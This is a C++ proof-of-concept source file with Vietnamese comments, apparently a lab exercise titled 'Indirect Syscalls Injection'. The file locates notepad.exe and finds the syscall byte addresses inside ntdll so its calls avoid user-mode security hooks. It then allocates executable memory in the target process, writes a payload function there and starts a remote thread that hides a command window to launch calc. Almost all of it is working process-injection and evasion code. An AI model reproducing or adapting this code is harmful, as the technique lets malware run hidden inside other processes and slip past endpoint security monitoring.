#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo các cổng hàm kết nối với file Assembly
extern "C" NTSTATUS NtAllocateVirtualMemoryProc(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
extern "C" NTSTATUS NtWriteVirtualMemoryProc(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

// Định nghĩa con trỏ biến toàn cục liên kết ngoài cho file ASM trỏ hướng
extern "C" ULONG_PTR g_NtAllocateSyscallAddr = 0;
extern "C" ULONG_PTR g_NtWriteSyscallAddr = 0;

// Khai báo nguyên mẫu hàm Native của NtCreateThreadEx trích xuất động đánh bại rào cản Build Number Windows 11
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
    );

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí gánh luồng chạy khi tiêm chéo biên giới
DWORD WINAPI RemoteIndirectSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối, phá băng hoàn toàn lỗi RIP tương đối
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm quét tịnh tiến để định vị chính xác địa chỉ byte chứa chỉ lệnh 'syscall' (0x0F, 0x05)
ULONG_PTR FindSyscallAddress(const char* functionName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 0;

    PBYTE pFuncBuf = (PBYTE)GetProcAddress(hNtdll, functionName);
    if (!pFuncBuf) return 0;

    // Quét tĩnh tối đa 32 byte bên trong lòng hàm hệ thống để lấy tọa độ byte syscall xịn
    for (int i = 0; i < 32; i++) {
        if (pFuncBuf[i] == 0x0F && pFuncBuf[i + 1] == 0x05) {
            return (ULONG_PTR)&pFuncBuf[i];
        }
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 25: INDIRECT SYSCALLS INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc nhen." << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    // ─── BƯỚC 1: TRÍCH XUẤT ĐỊA CHỈ BYTE SYSCALL XỊN TỪ RAM NTDLL ───
    g_NtAllocateSyscallAddr = FindSyscallAddress("NtAllocateVirtualMemory");
    g_NtWriteSyscallAddr = FindSyscallAddress("NtWriteVirtualMemory");

    if (!g_NtAllocateSyscallAddr || !g_NtWriteSyscallAddr) {
        std::cerr << "[-] Khong the dinh vi byte syscall hop phap trong ntdll!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Lay toa do byte Syscall cua NtAllocate: 0x" << std::hex << g_NtAllocateSyscallAddr << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess that bai!" << std::endl;
        return EXIT_FAILURE;
    }

    // Nạp động trích xuất con trỏ hàm NtCreateThreadEx thích ứng động với Windows 11 Kernel
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT VÙNG NHỚ GIÁN TIẾP QUA CỔNG PHẢN CHIẾU ASM JMP ───
    PVOID remoteCodeBuffer = NULL;
    NtAllocateVirtualMemoryProc(hProcess, &remoteCodeBuffer, 0, &functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    NtAllocateVirtualMemoryProc(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Indirect Syscall allocation failed!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cap phat vung nho Code RWX tu xa an toan: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc tham số tuyệt đối cục bộ trước khi đẩy sang RAM đối phương
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // ─── BƯỚC 3: GHI DỮ LIỆU GIÁN TIẾP QUA CỔNG JMP SYSCALL NTDLL ───
    SIZE_T bytesWritten = 0;
    // ĐỒNG BỘ ĐỊNH DANH HÀM: Đổi thành RemoteIndirectSyscallPayload để fix dứt điểm lỗi C2065
    NtWriteVirtualMemoryProc(hProcess, remoteCodeBuffer, (PVOID)RemoteIndirectSyscallPayload, functionSize, &bytesWritten);
    NtWriteVirtualMemoryProc(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), &bytesWritten);
    std::cout << "[+] Nap cheo song song ma may va tham so hoan tat." << std::endl;

    // ─── BƯỚC 4: KHỞI TẠO LUỒNG KÍCH NỔ THÍCH ỨNG ĐỘNG ───
    std::cout << "[*] Dang khoi tao luong tu xa de khai hoa logic..." << std::endl;
    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (hThread != NULL) {
        // VÁ LỖI C2065: Loại bỏ từ khóa Result chưa khai báo biến thô
        WaitForSingleObject(hThread, INFINITE);
        std::cout << "[+] Indirect Syscalls Injection Successful!" << std::endl;
        CloseHandle(hThread);
    }
    else {
        std::cerr << "[-] NtCreateThreadEx failed! Status code: 0x" << std::hex << status << std::endl;
    }

    // Giải phóng tài nguyên hệ thống triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}